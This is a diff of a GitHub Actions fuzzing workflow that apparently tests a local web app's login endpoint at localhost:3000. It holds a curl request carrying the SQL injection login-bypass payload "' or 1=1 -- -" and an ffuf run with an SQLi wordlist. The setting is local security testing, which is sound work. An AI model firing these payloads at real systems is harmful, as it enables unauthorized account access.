@@ -2,7 +2,6 @@ name: MyFuzzing
 
 on:
   push:
-    branches: [ main ]
   workflow_dispatch:
 
 permissions:
@@ -25,10 +24,11 @@ jobs:
       - name: Wait for service
         run: |
             sleep 10 
+            mkdir -p artifacts
             curl --path-as-is -i -s -k -X $'POST' \
               -H $'Host: localhost:3000' -H $'Content-Length: 43' -H $'Content-Type: application/json' -H $'Connection: keep-alive' \
               --data-binary $'{\"email\":\"\' or 1=1 -- -\",\"password\":\"pass\"}' \
-              $'http://localhost:3000/rest/user/login'
+              $'http://localhost:3000/rest/user/login' > artifacts/curlRes.json
 
       - name: Install fuzzing
         run: |
@@ -44,7 +44,7 @@ jobs:
       - name: Run ffuf login (email)
         run: |
           mkdir -p artifacts
-          ffuf -w payloads/sqli.txt -u 'http://localhost:3000/rest/user/login' -X POST -d 'email=FUZZ&password=pass' -ms 43 -o artifacts/ffuf.json
+          ffuf -w payloads/sqli.txt -u 'http://localhost:3000/rest/user/login' -X POST -d 'email=FUZZ&password=pass' -mc 200 -o artifacts/ffuf.json
 
       - name: Save sample response diff 
         run: |
